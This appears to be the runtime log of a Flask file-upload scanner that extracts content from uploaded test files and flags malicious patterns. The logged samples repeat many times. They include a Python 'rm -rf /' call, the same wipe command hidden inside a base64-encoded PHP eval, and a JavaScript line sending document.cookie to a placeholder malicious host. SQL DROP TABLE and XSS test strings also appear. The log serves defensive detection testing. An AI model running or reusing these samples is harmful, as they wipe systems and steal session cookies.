    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:52,950 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,952 - 127.0.0.1 - - [22/Feb/2025 19:36:52] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 19:36:52,956 - 127.0.0.1 - - [22/Feb/2025 19:36:52] "GET / HTTP/1.1" 200 -
2025-02-22 19:36:56,129 - 127.0.0.1 - - [22/Feb/2025 19:36:56] "GET / HTTP/1.1" 200 -
2025-02-22 19:59:43,868 - Extracted content from uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:59:43,876 - Embedded object detected in uploads/test_malicious.pptx
2025-02-22 19:59:43,876 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:00:35,338 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:03:51,163 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:03:51,164 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:03:51,164 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:03:51,164 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:03:51,164 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:03:51,164 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:03:51,171 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:03:51,175 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:03:51,175 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:03:51,175 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:03:51,175 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:03:51,176 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:03:51,176 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:03:51,180 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:03:51,184 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:03:51,185 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:03:51,185 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:03:51,185 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:03:51,185 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:03:51,185 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:03:51,189 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:03:51,193 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:03:51,193 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:03:51,193 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:03:51,194 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:03:51,194 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:03:51,194 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:03:51,199 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:03:51,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:03:51,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:03:51,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:03:51,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:03:51,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:03:51,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:03:51,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:03:51,207 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:03:51,211 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:03:51,211 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:03:51,211 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:03:51,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:03:51,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:03:51,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:03:51,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:03:51,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:03:51,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:03:51,217 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:03:51,220 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:03:51,221 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:03:51,221 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:03:51,221 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:03:51,221 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:03:51,221 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:03:51,221 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:03:51,221 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:03:51,221 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:03:51,225 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:03:51,229 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:03:51,229 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:03:51,231 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:03:51,231 - [33mPress CTRL+C to quit[0m
2025-02-22 20:03:54,697 - 127.0.0.1 - - [22/Feb/2025 20:03:54] "GET / HTTP/1.1" 200 -
2025-02-22 20:03:59,723 - Extracted content from uploads/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:03:59,723 - Malicious pattern detected in uploads/malicious.xlsx
2025-02-22 20:03:59,724 - 127.0.0.1 - - [22/Feb/2025 20:03:59] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:03:59,726 - 127.0.0.1 - - [22/Feb/2025 20:03:59] "GET / HTTP/1.1" 200 -
2025-02-22 20:04:03,996 - Extracted content from uploads/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:04:03,997 - Malicious pattern detected in uploads/malicious.pptx
2025-02-22 20:04:03,997 - 127.0.0.1 - - [22/Feb/2025 20:04:03] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:04:04,001 - 127.0.0.1 - - [22/Feb/2025 20:04:04] "GET / HTTP/1.1" 200 -
2025-02-22 20:04:13,791 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:13,791 - Extracted content from uploads/new_test/new_test/test_hidden_xml.xml: <?xml version="1.0" encoding="UTF-8"?>
<root>
    <data>
        <item>Normal content</item>
        <item>SELECT * FROM users WHERE username = 'admin'</item> <!-- SQL Injection -->
    </data>
</root>
2025-02-22 20:04:13,791 - Malicious pattern detected in uploads/new_test/new_test/test_hidden_xml.xml
2025-02-22 20:04:13,802 - Extracted content from uploads/new_test/new_test/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 20:04:13,802 - Malicious pattern detected in uploads/new_test/new_test/test_doc_hidden.docx
2025-02-22 20:04:13,810 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:13,814 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:13,814 - Extracted content from uploads/new_test/new_test/test_sql_injection.txt: echo "SELECT * FROM users WHERE username = 'admin' AND password = 'password'" > test_sql_injection.txt
2025-02-22 20:04:13,814 - Malicious pattern detected in uploads/new_test/new_test/test_sql_injection.txt
2025-02-22 20:04:13,814 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:13,817 - Extracted content from uploads/new_test/new_test/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:04:13,818 - Malicious pattern detected in uploads/new_test/new_test/malicious.xlsx
2025-02-22 20:04:13,821 - Extracted content from uploads/new_test/new_test/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:04:13,821 - Malicious pattern detected in uploads/new_test/new_test/malicious.pptx
2025-02-22 20:04:13,821 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:13,826 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:13,829 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:13,829 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:13,830 - 127.0.0.1 - - [22/Feb/2025 20:04:13] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 20:04:13,833 - 127.0.0.1 - - [22/Feb/2025 20:04:13] "GET / HTTP/1.1" 200 -
2025-02-22 20:04:38,580 - Extracted content from uploads/flask_file_upload/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 20:04:38,580 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/create_malicious_xlsx.py
2025-02-22 20:04:38,580 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:04:38,582 - Extracted content from uploads/flask_file_upload/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "xlsx", "ppt", "pptx", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", 
2025-02-22 20:04:38,582 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/app.py
2025-02-22 20:04:38,582 - Extracted content from uploads/flask_file_upload/flask_file_upload/create_malicious_pptx.py: from pptx import Presentation

def create_malicious_pptx(filename):
    # Create a new Presentation
    ppt = Presentation()
    
    # Add a slide
    slide = ppt.slides.add_slide(ppt.slide_layouts[5])  # Title Slide layout
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "<script>alert('XSS');</script>",
        "eval('some malicious code');"
    ]
    
    for line in suspicious_content:

2025-02-22 20:04:38,582 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/create_malicious_pptx.py
2025-02-22 20:04:38,588 - Extracted content from uploads/flask_file_upload/flask_file_upload/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:04:38,588 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/malicious.xlsx
2025-02-22 20:04:38,596 - Extracted content from uploads/flask_file_upload/flask_file_upload/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:04:38,596 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/malicious.pptx
2025-02-22 20:04:38,600 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,605 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,608 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:04:38,609 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:04:38,616 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,620 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,625 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,628 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:04:38,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:04:38,635 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,639 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
